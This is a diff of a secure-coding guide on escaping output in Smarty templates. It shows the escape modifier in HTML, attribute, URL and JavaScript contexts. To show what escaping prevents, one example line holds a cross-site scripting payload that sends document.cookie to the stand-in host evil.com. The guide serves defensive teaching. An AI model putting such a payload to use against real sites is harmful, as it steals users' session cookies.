@@ -11,13 +11,13 @@ Escaping output means converting special characters in data into safe representa
 Suppose a user submits a holiday name containing JavaScript:
 
 ```
-&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
 ```
 
 If your template outputs this value without escaping:
 
-```html
-&lt;td&gt;{$holiday->name}&lt;/td&gt;
+```smarty
+<td>{$holiday->name}</td>
 ```
 
 The script will execute in every admin's browser who views the list. With escaping, the output is rendered as harmless text instead.
@@ -28,34 +28,34 @@ The script will execute in every admin's browser who views the list. With escapi
 
 Smarty provides the `escape` modifier for HTML context:
 
-```html
-&lt;!-- Escape for HTML output --&gt;
-&lt;td&gt;{$holiday->name|escape}&lt;/td&gt;
-&lt;td&gt;{$holiday->description|escape}&lt;/td&gt;
+```smarty
+<!-- Escape for HTML output -->
+<td>{$holiday->name|escape}</td>
+<td>{$holiday->description|escape}</td>
 
-&lt;!-- In an attribute --&gt;
-&lt;input type="text" name="{$actionid}name" value="{$holiday->name|escape}" /&gt;
+<!-- In an attribute -->
+<input type="text" name="{$actionid}name" value="{$holiday->name|escape}" />
 
-&lt;!-- In a link title --&gt;
-&lt;a href="{$edit_url}" title="{$holiday->name|escape}"&gt;Edit&lt;/a&gt;
+<!-- In a link title -->
+<a href="{$edit_url}" title="{$holiday->name|escape}">Edit</a>
 ```
 
 The `escape` modifier with no arguments defaults to HTML escaping — converting `<`, `>`, `&`, `"`, and `'` to their HTML entity equivalents.
 
 #### Different escape contexts
 
-```html
-&lt;!-- HTML (default) --&gt;
+```smarty
+<!-- HTML (default) -->
 {$value|escape}
 {$value|escape:'html'}
 
-&lt;!-- URL encoding --&gt;
-&lt;a href="page.php?name={$value|escape:'url'}"&gt;
+<!-- URL encoding -->
+<a href="page.php?name={$value|escape:'url'}">
 
-&lt;!-- JavaScript string --&gt;
-&lt;script&gt;var name = '{$value|escape:'javascript'}';&lt;/script&gt;
+<!-- JavaScript string -->
+<script>var name = '{$value|escape:'javascript'}';</script>
 
-&lt;!-- HTML entity encoding (numeric) --&gt;
+<!-- HTML entity encoding (numeric) -->
 {$value|escape:'htmlall'}
 ```
 
@@ -91,11 +91,11 @@ $safe = urlencode($value);
 
 To remove HTML tags entirely (e.g., for search indexing or plain-text summaries):
 
-```
-&lt;!-- In Smarty --&gt;
+```smarty
+<!-- In Smarty -->
 {$holiday->description|strip_tags}
 
-&lt;!-- In Smarty with summarize --&gt;
+<!-- In Smarty with summarize -->
 {$holiday->description|strip_tags|summarize}
 ```
 ```
